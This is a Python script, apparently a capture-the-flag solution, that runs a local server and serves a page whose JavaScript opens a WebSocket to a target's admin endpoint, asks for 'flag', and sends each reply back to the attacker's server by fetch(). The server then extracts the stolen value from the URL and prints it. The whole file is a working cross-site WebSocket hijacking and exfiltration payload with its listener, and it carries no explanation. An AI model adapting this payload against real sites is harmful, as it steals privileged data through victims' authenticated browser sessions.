
from http.server import BaseHTTPRequestHandler, HTTPServer


class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if 'flag=' in self.path:
            flag = self.path.split('flag=')[1].split('&')[0]
            print(f'🔑 Flag is \33[92m{flag}\33[0m')
            self.send_response(200, 'OK')
            self.end_headers()
            exit(0)
        else:
            print('🔍 \33[90mNo flag found in path\33[0m')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())


serving_url = 'http://localhost:8569/'
html = f'''
<html>
    <title>M</title>
    <body>
        <h1>W <3</h1>
    </body>
    <script>
        ws = new WebSocket('ws://web:8080/admin/ws');
        ws.onmessage = message => {{
            fetch(`{serving_url}?flag=${{message.data}}`, {{
                'method': 'GET',
                'credentials': 'include',
            }});
        }};
        ws.onopen = () => {{
            ws.send('flag');
        }}
    </script>
</html>
'''

server = HTTPServer(('localhost', 8569), HTTPRequestHandler)
server.serve_forever()